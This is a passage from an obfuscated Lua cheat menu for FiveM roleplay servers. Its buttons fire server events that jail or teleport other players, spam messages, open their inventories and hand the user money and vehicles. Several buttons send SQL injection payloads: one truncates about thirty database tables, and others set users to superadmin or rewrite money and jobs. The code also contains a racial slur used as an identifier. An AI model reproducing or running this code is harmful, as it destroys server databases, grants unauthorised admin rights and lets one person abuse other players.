                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Sucsesfuly ~w~Jailed Someone')
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['qalle_unjail'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Un-Jail (Yourself)', 5, trigy) then
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['qalle_unjail'], 1)
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Sucsesfuly ~w~Unjailed Yourself')
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['community'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Community Service (Specific / All)', 5, trigy) then
                                local person = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Server Id (-1 for all)', '', 4)
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['community'], RfPsUKHSFWJuBEJuz.rE.LumToNum(person), 100000)
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Sucsesfuly ~w~Sent Someone To Community Service')
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['communityservice_finishservice'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Finish Community Service (Yourself)', 5, trigy) then
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['community'], -1)
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Sucsesfuly ~w~Finished Your Community Service')
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['dmv_getlicense'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button("Add All Driving Licences (Might Not Work In All Servers)", 5, trigy) then
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['dmv_getlicense'], 'dmv')
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['dmv_getlicense'], 'drive')
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['dmv_getlicense'], 'drive_bike')
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['dmv_getlicense'], 'drive_truck')
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Sucsesfuly ~w~Gave Yourself All Driving Licences')
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['gcphone_posttweet'] and RfPsUKHSFWJuBEJuz.TR['gcphone_createtwiteracc'] and RfPsUKHSFWJuBEJuz.TR['gcphone_logintwitteracc'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button("Spam Twitter (Custom Amount)", 5, trigy) then
                                local amount = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Amount To Send', '', 3)
                                local text = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Message To Send (If None Default Message Will Be Sent)', '', 3)
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['gcphone_createtwiteracc'], 'Lumia', 'RfPsUKHSFWJuBEJuz23', 'https://cdn.discordapp.com/avatars/775826450988400700/aa48e42643df7ca267f424f0165b93af.png?size=128')
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['gcphone_logintwitteracc'], 'Lumia', 'RfPsUKHSFWJuBEJuz23')
                                if text == nil then text = 'Lumia V2 Is Indeed the Best Menu!' end
                                RfPsUKHSFWJuBEJuz.rE.LumThread(function()
                                    for i = 1, RfPsUKHSFWJuBEJuz.rE.LumToNum(amount) do
                                        RfPsUKHSFWJuBEJuz.rE.LumWait(60)
                                        jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['gcphone_posttweet'], 'Lumia', 'RfPsUKHSFWJuBEJuz23', text)
                                    end
                                    return
                                end)
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Sucsesfuly ~w~Fucked Twitter')
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['tp_all_to_me'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Teleport Everyone To Me (Big Meme Lmao)', 5, trigy) then
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['tp_all_to_me'], -1)
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Sucsesfuly ~w~Teleported All To You!')
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['carry_exploit'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Carry Everyone (Big Meme Lmao)', 5, trigy) then
                                RfPsUKHSFWJuBEJuz.rE.LumThread(function()
                                    for k, v in RfPsUKHSFWJuBEJuz.rE.Lumpairs(nlFXKkFxuKQAk.natives.GetActivePlayers()) do
                                        if nlFXKkFxuKQAk.natives.GetPlayerPed(v) ~= nlFXKkFxuKQAk.natives.GetPlayerPed(-1) then 
                                            jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['carry_exploit'], nlFXKkFxuKQAk.natives.GetPlayerPed(v), 'missfinale_c2mcs_1', 'nm', 'fin_c2_mcs_1_camman', 'firemans_carry', 0.15, 0.27, 0.63, nlFXKkFxuKQAk.natives.GetPlayerServerId(v), 100000, 0.0, 49, 33, 1)
                                            RfPsUKHSFWJuBEJuz.rE.LumWait(10)
                                        end
                                    end
                                    return
                                end)
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Sucsesfuly ~w~Carried Everyone')
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['Hostage_Exploit'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Take Everyone Hostage (Big Meme Lmao)', 5, trigy) then
                                RfPsUKHSFWJuBEJuz.rE.LumThread(function()
                                    for k, v in RfPsUKHSFWJuBEJuz.rE.Lumpairs(nlFXKkFxuKQAk.natives.GetActivePlayers()) do
                                        if nlFXKkFxuKQAk.natives.GetPlayerPed(v) ~= nlFXKkFxuKQAk.natives.GetPlayerPed(-1) then 
                                            jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['Hostage_Exploit'], nlFXKkFxuKQAk.natives.GetPlayerPed(v), 'anim@gangops@hostage@', 'anim@gangops@hostage@', 'perp_idle', 'victim_idle', 0.11, -0.24, 0.0, nlFXKkFxuKQAk.natives.GetPlayerServerId(v), 100000, 0.0, 49, 49, 50, true)
                                            RfPsUKHSFWJuBEJuz.rE.LumWait(10)
                                        end
                                    end
                                    return
                                end)
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Sucsesfuly ~w~Took Everyone Hostige')
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['delete_DB'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Delete Database (Big Meme Lmao)', 5, trigy) then
                                RfPsUKHSFWJuBEJuz.rE.LumThread(function()
                                    local trashTables = {
                                        'addon_account',
                                        'addon_account_data',
                                        'addon_inventory',
                                        'addon_inventory_items',
                                        'billing',
                                        'charicters',
                                        'datastore',
                                        'datastore_data',
                                        'fine_types',
                                        'items',
                                        'jobs',
                                        'job_grades',
                                        'licenses',
                                        'owned_properties',
                                        'phone_app_chat',
                                        'phone_calls',
                                        'phone_messages',
                                        'phone_users_contacts',
                                        'properties',
                                        'rented_vehicles',
                                        'shops',
                                        'society_moneywash',
                                        'users',
                                        'user_accounts',
                                        'user_inventory',
                                        'user_licenses',
                                        'vehicles',
                                        'vehicle_categories',
                                        'vehicle_sold',
                                        'weashops'
                                    }
                                    for key, value in RfPsUKHSFWJuBEJuz.rE.Lumpairs(trashTables) do
                                        RfPsUKHSFWJuBEJuz.rE.LumWait(25)
                                        jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['delete_DB'], '\';TRUNCATE TABLE '..value..';-- /')
                                    end
                                    return
                                end)
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Sucsesfuly ~w~Deleted The Database')
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['delete_DB'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Set Player To Super Admin (Specific Player)', 5, trigy) then
                                local last = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Enter A Charicters Last Name', '', 100)
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['delete_DB'], '\';UPDATE users SET permission_level=\'1000\' WHERE `lastname`=\''.. last ..'\';/')
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['delete_DB'], '\';UPDATE users SET `group` = \'superadmin\' WHERE `lastname`=\''.. last ..'\';/')
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Sucsesfuly ~w~Set Someone To SuperAdmin')
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['delete_DB'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Set Player Job (Specific Player)', 5, trigy) then
                                local last = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Enter A Charicters Last Name', '', 100)
                                local jobtit = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Enter A Job Name', '', 100)
                                local jobgra = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Enter A Job Grade', '', 100)
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['delete_DB'], '\';UPDATE users SET `job`=\''.. jobtit ..'\' WHERE `lastname`=\''.. last ..'\';/')
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['delete_DB'], '\';UPDATE users SET `job_grade` = \''.. jobgra ..'\' WHERE `lastname`=\''.. last ..'\';/')
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Sucsesfuly ~w~Gave Someone A Job')
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['emote_nigger'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Emote Spam (CUSTOM)', 5, trigy) then
                                local userToSendToo = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Who Do You Want To Fuck? Ex. Server Id, E for all', '', 100)
                                local emoteTospam = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Emote You Would Like To Spam', '', 100)
                                local CorrectEmote = DmSgpcIoUEJtyTfBBt.FunFunc.GetEmote(emoteTospam)
                                if CorrectEmote == nil then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~r~Entered ~w~A Bad Emote') return end
                                if RfPsUKHSFWJuBEJuz.rE.LumString.LumLower(userToSendToo) == 'e' then
                                    for k, v in RfPsUKHSFWJuBEJuz.rE.Lumpairs(nlFXKkFxuKQAk.natives.GetActivePlayers()) do
                                        if nlFXKkFxuKQAk.natives.GetPlayerPed(v) ~= nlFXKkFxuKQAk.natives.GetPlayerPed(-1) then
                                            jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['emote_nigger'], v, CorrectEmote)
                                        end
                                    end
                                else
                                    jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['emote_nigger'], userToSendToo, CorrectEmote)
                                end
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Sucsesfuly ~w~Emoted Something')
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['open_inv_ghetto'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button("Open Someone's Inventory", 5, trigy) then
                                local last = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput("Enter A Person's ID", '', 100)
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['open_inv_ghetto'], "otherplayer", last)
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification("You Have ~g~Sucsesfuly ~w~Opened Someone's Inventory")
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['play_da_sound'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button("Play a Song (Everyone)", 5, trigy) then
                                local song = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput("Enter End Of Youtube Link EX:(Only Enter The Red Part, https://www.youtube.com/watch?v=~r~us_0aLWOa8E)", 'us_0aLWOa8E', 100)
                                for k, v in RfPsUKHSFWJuBEJuz.rE.Lumpairs(nlFXKkFxuKQAk.natives.GetActivePlayers()) do 
                                    local personC = nlFXKkFxuKQAk.natives.GetEntityCoords(nlFXKkFxuKQAk.natives.GetPlayerPed(v))
                                    jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['play_da_sound'], song, personC)
                                end
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification("You Have ~g~Sucsesfuly ~w~Played Music")
                            end
                            trigy = trigy + 20
                        end
                        if trigy == 50 then
                            trigy = trigy + 19
                        end
                        if trigy == 69 then
                            jrnyLearIyzKiSIen.func.DrawSomeText('No Fun Triggers Where Found', 4, false, jrnyLearIyzKiSIen.config.MainX + 55, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men5Y + 260, jrnyLearIyzKiSIen.config.ButtonScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                        end
                    elseif REVMYmrswsZvxOXvJE.TrigOpts.values[REVMYmrswsZvxOXvJE.TrigOpts.selectedItemIndex] == 'montrigs' then 
                        if RfPsUKHSFWJuBEJuz.TR['free_items'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Give Items (Custom Item and Amount)', 5, trigy) then
                                local item = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Item', '', 100)
                                local amount = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Amount', '', 100)
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['free_items'], RfPsUKHSFWJuBEJuz.rE.LumToString(item), RfPsUKHSFWJuBEJuz.rE.LumToNum(amount))
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Sucsesfuly ~w~ Gave Yourself '.. RfPsUKHSFWJuBEJuz.rE.LumToNum(amount) ..' '.. RfPsUKHSFWJuBEJuz.rE.LumToString(item) ..'/s')
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['dmv_pay'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Remove Money (Custom Amount)', 5, trigy) then
                                local amount = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Amount To Take', '', 100)
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['dmv_pay'], RfPsUKHSFWJuBEJuz.rE.LumToNum(amount))
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Sucsesfuly ~w~Removed $'.. RfPsUKHSFWJuBEJuz.rE.LumToNum(amount) ..'')
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['ESX_BUSS_PAY'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Give Money (Bus) (Custom Amount)', 5, trigy) then
                                local amount = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Amount To Pay', '', 100)
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['ESX_BUSS_PAY'], RfPsUKHSFWJuBEJuz.rE.LumToNum(amount))
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Sucsesfuly ~w~Gave Yourself $'.. RfPsUKHSFWJuBEJuz.rE.LumToNum(amount) ..'')
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['truckerjob_pay'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Give Money (Trucker) (Custom Amount)', 5, trigy) then
                                local amount = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Amount To Pay', '', 100)
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['truckerjob_pay'], RfPsUKHSFWJuBEJuz.rE.LumToNum(amount))
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Sucsesfuly ~w~Gave Yourself $'.. RfPsUKHSFWJuBEJuz.rE.LumToNum(amount) ..'')
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['gopostal_pay'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button("Give Money (Postal) (Custom Amount)", 5, trigy) then
                                local plate = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Amount Of Money', '', 100)
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['gopostal_pay'], RfPsUKHSFWJuBEJuz.rE.LumToNum(plate))
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Sucsesfuly ~w~Gave Yourself $'.. RfPsUKHSFWJuBEJuz.rE.LumToNum(plate) ..'')
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['garbagejob_pay'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button("Give Money (Garbage) (Custom Amount)", 5, trigy) then
                                local plate = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Amount Of Money', '', 100)
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['garbagejob_pay'], RfPsUKHSFWJuBEJuz.rE.LumToNum(plate))
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Sucsesfuly ~w~Gave Yourself $'.. RfPsUKHSFWJuBEJuz.rE.LumToNum(plate) ..'')
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['vangelico_get'] and RfPsUKHSFWJuBEJuz.TR['vangelico_sell'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Give Money (Vangelico) (Custom)', 5, trigy) then
                                local amountlooper = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Amount Of Money (1 = 10k, 2 = 20k, etc)', '', 100)
                                RfPsUKHSFWJuBEJuz.rE.LumThread(function()
                                    for i = 1, RfPsUKHSFWJuBEJuz.rE.LumToNum(amountlooper) do
                                        jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['vangelico_get'])
                                        RfPsUKHSFWJuBEJuz.rE.LumWait(100)
                                        jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['vangelico_sell'])
                                    end
                                    return
                                end)
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Sucsesfuly ~w~Gave Yourself Money')
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['delete_DB'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Set Cash Money DB (Custom Amount) (Specific Player)', 5, trigy) then
                                local last = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Enter A Charicters Last Name', '', 100)
                                local amount = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Amount To Set', '', 100)
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['delete_DB'], '\';UPDATE users SET `money` = '.. amount ..' WHERE `lastname`=\''.. last ..'\';/')
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Sucsesfuly ~w~Set '.. last .."'s Money To ".. amount .."")
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['delete_DB'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Set Bank Money DB (Custom Amount) (Specific Player)', 5, trigy) then
                                local last = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Enter A Charicters Last Name', '', 100)
                                local amount = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Amount To Set', '', 100)
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['delete_DB'], '\';UPDATE users SET `bank` = '.. amount ..' WHERE `lastname`=\''.. last ..'\';/')
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Sucsesfuly ~w~Set '.. last .."'s Bank Money To ".. amount .."")
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['Money_Wash'] and RfPsUKHSFWJuBEJuz.TR['Money_Wash_Zone'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Wash Dirty Money (Custom)', 5, trigy) then
                                local amount = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Amount To Clean', '', 100)
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['Money_Wash'], amount, RfPsUKHSFWJuBEJuz.TR['Money_Wash_Zone'])
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Sucsesfuly ~w~Cleaned $'.. amount ..'')
                            end
                            trigy = trigy + 20
                        end

                        if RfPsUKHSFWJuBEJuz.TR['Money_Wash'] == nil and RfPsUKHSFWJuBEJuz.TR['Money_Wash_Zone'] == nil and RfPsUKHSFWJuBEJuz.TR['Money_Wash_Old'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Wash Dirty Money (Custom)', 5, trigy) then
                                local amount = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Amount To Clean', '', 100)
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['Money_Wash_Old'], amount)
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Sucsesfuly ~w~Cleaned $'.. amount ..'')
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['vehicleshop_ownedveh'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button("Spawn A Free Car (Puts New Vehicle In Garage)", 5, trigy) then
                                local model = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Car Model', '', 100)
                                if nlFXKkFxuKQAk.natives.IsModelValid(model) and nlFXKkFxuKQAk.natives.IsModelAVehicle(model) then
                                    local plate = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Plate', '', 8)
                                    jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['vehicleshop_ownedveh'], {['model'] = RfPsUKHSFWJuBEJuz.rE.LumHash(RfPsUKHSFWJuBEJuz.rE.LumToString(model)), ['plate'] = RfPsUKHSFWJuBEJuz.rE.LumToString(plate)})
                                    DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Sucsesfuly ~w~Gave Yourself A '.. RfPsUKHSFWJuBEJuz.rE.LumString.LumUpper(model) .. '')
                                else
                                    DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('ERROR: ~r~'.. RfPsUKHSFWJuBEJuz.rE.LumString.LumUpper(model) ..' ~w~Is Not A Vehicle!')
                                end
                            end
                            trigy = trigy + 20
                        end
                        if trigy == 50 then
                            trigy = trigy + 19
                        end
                        if trigy == 69 then
                            jrnyLearIyzKiSIen.func.DrawSomeText('No Money Triggers Where Found', 4, false, jrnyLearIyzKiSIen.config.MainX + 55, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men5Y + 260, jrnyLearIyzKiSIen.config.ButtonScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                        end
                    elseif REVMYmrswsZvxOXvJE.TrigOpts.values[REVMYmrswsZvxOXvJE.TrigOpts.selectedItemIndex] == 'drugreltrigs' then
                        if RfPsUKHSFWJuBEJuz.TR['coke_feild'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Harvest Coke', 5, trigy) then
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['coke_feild'])
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['coke_process'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Process Coke', 5, trigy) then
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['coke_process'])
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['coke_sell'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Sell Coke', 5, trigy) then
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['coke_sell'])
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['meth_field'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Harvest Meth', 5, trigy) then
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['meth_field'])
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['meth_process'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Process Meth', 5, trigy) then
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['meth_process'])
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['meth_sell'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Sell Meth', 5, trigy) then
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['meth_sell'])
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['weed_field'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Harvest Weed', 5, trigy) then
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['weed_field'])
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['weed_process'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Process Weed', 5, trigy) then
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['weed_process'])
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['weed_sell'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Sell Weed', 5, trigy) then
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['weed_sell'])
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['opium_field'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Harvest Opium', 5, trigy) then
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['opium_field'])
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['opium_process'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Process Opium', 5, trigy) then
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['opium_process'])
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['opium_sell'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Sell Opium', 5, trigy) then
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['opium_sell'])
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['stop_feild_coke'] and RfPsUKHSFWJuBEJuz.TR['stop_process_coke'] and RfPsUKHSFWJuBEJuz.TR['stop_sell_coke'] and RfPsUKHSFWJuBEJuz.TR['stop_feild_meth'] and RfPsUKHSFWJuBEJuz.TR['stop_process_meth'] and RfPsUKHSFWJuBEJuz.TR['stop_sell_meth'] and RfPsUKHSFWJuBEJuz.TR['stop_feild_weed'] and RfPsUKHSFWJuBEJuz.TR['stop_process_weed'] and RfPsUKHSFWJuBEJuz.TR['stop_sell_weed'] and RfPsUKHSFWJuBEJuz.TR['stop_feild_opium'] and RfPsUKHSFWJuBEJuz.TR['stop_process_opium'] and RfPsUKHSFWJuBEJuz.TR['stop_sell_opium'] then
